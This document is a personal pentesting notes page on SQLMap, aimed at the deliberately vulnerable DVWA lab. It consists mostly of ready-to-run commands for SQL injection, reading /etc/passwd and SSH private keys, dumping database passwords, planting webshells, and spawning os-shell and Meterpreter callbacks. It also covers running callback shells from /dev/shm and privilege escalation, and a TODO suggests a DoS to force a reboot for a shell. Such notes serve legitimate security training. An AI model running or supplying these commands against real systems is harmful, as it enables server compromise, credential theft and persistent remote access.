# SQLMap

#sqli #sqlmap

TODO: Fill in the rest of the output when necessary

## 01 - Exploit

- SQLMap will automate by injecting queries of every possible techniques by default it uses `--technique=BEUSTQ` and it'll enumerate a backend database.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent
```

- Force the DBMS to skip automatic enumeration using the flag `--dbms=mysql`

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --dbms=mysql
```

- You can specify SQL injection techniques. It also speeds up the process. One for error-based query and union query-based respectively.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --dbms=mysql --technique=E

$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --dbms=mysql --technique=U
```

- You can specify number of columns after performing [[UNION Query SQL Injection#^78ef92|fields enumeration]].

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --dbms=mysql --technique=U --union-cols=2
```

- You can specify the prefix (`'`) and suffix (`#`) after performing manual enumeration in the [[Error-based Query SQL Injection#^bc051d|joining the query]] section.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --dbms=mysql --prefix="'" --suffix="#" --technique=U
```
## 03 - Enumeration

### 3.1 -  OS Enumeration

#### 3.1.1 - General

Note: This requires **SELECT** and **FILE** privilege in order to read files externally. Enumerate the user DB account for privileges before proceeding these steps.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --technique=U --privileges
```

- Enumerate hostname

```
$ sqlmap "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --technique=U --hostname
```
#### 3.1.2 - Linux

- Enumerating user accounts

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --technique=U --file-read="/etc/passwd"

$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --technique=U --sql-query="SELECT LOAD_FILE('/etc/passwd')"
```

- Retrieve SSH keys

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --technique=U --file-read="/home/<username>/.ssh/id_rsa"
```

#### 3.1.2 - Windows

TODO: Provide examples for windows OS enumeration using such as, `--reg-read` and `--file-read`

### 3.2 - Database Enumeration

#### 3.2.1 - Manual Enumeration

- Interactive `--sql-shell` prompt to perform SQL statement queries manually.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --technique=U --sql-shell

sql-shell> SELECT @@VERSION()

sql-shell> SELECT table_name FROM information_schema.tables

sql-shell> SELECT column_name FROM information_schema.columns

sql-shell> SELECT USER()

sql-shell> SELECT DATABASE()

sql-shell> SELECT GRANTEE, IS_GRANTABLE, PRIVILEGE_TYPE, TABLE_CATALOG FROM information_schema.USER_PRIVILEGES
```

- Banner grab DBMS backend.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent -b
```

- Fingerprint the DBMS backend extensively.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent -f --dbms=mysql --technique=U
```

- Enumerate current user database and check if it's DB administrator.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --technique=U --current-user --is-dba 
```

- Enumerate user database accounts

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --technique=U --users
```

- Dump user database passwords

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --technique=U --passwords
```

- Enumerate privileges and roles.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --technique=U --roles
```

- Enumerate database schema.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --technique=U --schema
```

- Enumerate database schema yet exclude system databases.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --technique=U --schema --exclude-sysdbs
```

- Enumerate current database.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --technique=U --current-db
```

- Enumerate available databases.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --technique=U --dbs
```

#### 2.2.2 - Tables Enumeration

- Search particular keywords of database, tables and columns

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --search -D dvwa -T users -C user,password,username,emails
```

- Retrieve relation (tables)

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --technique=U -D dvwa --tables
```

- Count number of tables

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --technique=U -D dvwa --tables --count
```

#### 2.2.3 - Columns Enumeration

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --technique=U -D dvwa -T users --columns
```

--comments          Check for DBMS comments during enumeration
--statements        Retrieve SQL statements being run on DBMS
## 03 - Dump Database

### 3.1 - Dump the whole database

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --technique=U -D dvwa --dump-all
```

### 3.2 - Dump the specific tables and columns

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --technique=U -D dvwa -T users -C user,password --dump
```

## 04 - Webshell

### 4.1 - Upload a specific Webshell

Refer to this [[Pentesting Phases/Initial Access/Callback Shells/Webshells|link]] to generate interactive weevely webshells and click [[Weevely|here]] for post exploitation section.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --technique=U --file-write="/path/to/webshell.php" --file-dest="/var/www/html/dvwa/shell.php"
```

### 4.2 - Spawn an Interactive Webshell

TODO: Provide **\[INFO\]** logs and a screenshot to demonstrate a different between a file web stager (the uploader file) and a backdoor (an interactive shell)

Great thing about SQLMap that not only it uploads an interactive **web backdoor (the webshell)** it also comes with the **web file stager (the uploader)**.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --technique=U --os-shell --web-root="/var/www/html/dvwa/"
```

### 4.3 - Spawn a Meterpreter Shell

- Start a shell handler listener in Metasploit to retrieve a callback meterpreter session.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --technique=U --os-pwn --web-root="/var/www/html/dvwa/"
```

Note: when using the `--priv-esc` flag this is for targeting Windows operating systems to automate using the `getsystem` function for impersonation.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --technique=U --random-agent --os-pwn --web-root="/var/www/html/dvwa/" --priv-esc
```
### 4.4 - Execute OS Command

#### 4.4.1 - General

- Execute any command

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --technique=U --os-cmd="whoami"
```

#### 4.4.2 - Linux

- Execute the callback shell in disk

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --technique=U --file-write="/path/to/shell.py" --file-dest="/tmp/shell.py"

$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --technique=U --os-cmd="python /tmp/shell.py"
```

- Execute the callback shell in memory (fileless memory)

1. Copy the file in `/dev/shm/` directory

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --technique=U --file-write="/path/to/shell.py" --file-dest="/dev/shm/shell.py"

$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --technique=U --os-cmd="python /dev/shm/shell.py"
```

2. Execute a one liner

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --technique=U --os-cmd="python -c <payload>"
```

#### 4.4.3 - Windows

TODO: Provide examples for windows OS enumeration using windows registry commands to apply the same methods in [[Registry|lateral movement]] and [[Registry Keys|persistence methods]]. Also provide a scenario if it's not possible to reboot the windows machine. An attacker can use Denial of Service (DoS) attack vector to crash the machine then it reboots to get a callback shell.

Windows registry access:
These options can be used to access the back-end database management
system Windows registry

--reg-read          Read a Windows registry key value
--reg-add           Write a Windows registry key value data
--reg-del           Delete a Windows registry key value
--reg-key=REGKEY    Windows registry key
--reg-value=REGVAL  Windows registry key value
--reg-data=REGDATA  Windows registry key value data
--reg-type=REGTYPE  Windows registry key value type

## References

- [Hacking Articles: File System Access on Webserver Using SQLMap](https://www.hackingarticles.in/file-system-access-on-webserver-using-sqlmap/)

- [SQLMap Read File on the Server](https://rioasmara.com/2020/05/25/sqlmap-read-file-on-the-server/)

- [SQLMAP – Enumeration of Databases & Users from Vulnerable Web Forms](https://kalilinuxtutorials.com/sqlmap2/)

- [IOSec: SQLMap](https://iosec.in/sqlmap-4/)

- [Pwning a Shell via MSSQL DBMS](https://owasp.org/www-chapter-ghana/assets/slides/Pwning_a_shell_via_MSSQL_DBMS.pdf)